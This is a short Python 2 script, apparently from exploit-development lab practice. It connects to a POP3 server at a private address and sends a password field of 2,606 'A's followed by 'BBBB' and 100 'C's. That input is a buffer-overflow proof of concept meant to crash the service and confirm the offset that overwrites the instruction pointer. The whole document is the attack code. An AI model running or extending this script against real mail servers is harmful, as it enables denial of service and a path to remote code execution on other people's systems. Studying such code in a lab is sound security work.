#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2606 
buffer += "B" * 4 
buffer += "C" * 100

try:
	print "\nSending evil buffer..."
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.24.174',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
